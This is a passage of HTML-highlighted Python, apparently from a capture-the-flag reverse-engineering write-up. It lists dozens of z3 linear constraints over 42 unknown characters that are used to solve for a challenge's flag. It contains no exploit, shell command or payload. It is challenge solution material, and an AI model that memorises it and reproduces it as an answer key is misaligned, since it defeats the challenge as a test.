class=\"number\">26</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">11</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">1</span>]==<span class=\"number\">328</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">22</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">36</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">26</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">6</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">10</span>]==-<span class=\"number\">196</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">11</span>]+l[<span class=\"number\">13</span>]+l[<span class=\"number\">14</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">25</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">32</span>]==<span class=\"number\">7</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">34</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">7</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">17</span>]==-<span class=\"number\">945</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">12</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">7</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">23</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">29</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">1</span>]==-<span class=\"number\">480</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">36</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">19</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">38</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">4</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">35</span>]==-<span class=\"number\">213</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">19</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">7</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">23</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">3</span>]==-<span class=\"number\">386</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">0</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">22</span>]==-<span class=\"number\">349</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">10</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">26</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">25</span>]==<span class=\"number\">98</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">28</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">32</span>]==-<span class=\"number\">412</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">1</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">30</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">12</span>]==-<span class=\"number\">95</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">2</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">23</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">38</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">13</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">28</span>]==-<span class=\"number\">379</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">19</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">35</span>]==<span class=\"number\">861</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">35</span>]+l[<span class=\"number\">36</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">26</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">4</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">25</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">18</span>]==<span class=\"number\">1169</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">13</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">6</span>]==-<span class=\"number\">1236</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">20</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">15</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">22</span>]==-<span class=\"number\">114</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">12</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">30</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">21</span>]==<span class=\"number\">659</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">21</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">19</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">11</span>]==-<span class=\"number\">430</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">11</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">21</span>]==-<span class=\"number\">513</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">32</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">30</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">35</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">29</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">21</span>]==-<span class=\"number\">502</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">30</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">25</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">14</span>]==<span class=\"number\">853</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">38</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">36</span>]-l[<span class=\"number\">30</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">15</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">13</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">27</span>]==-<span class=\"number\">28</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">11</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">6</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">38</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">10</span>]-l[<span 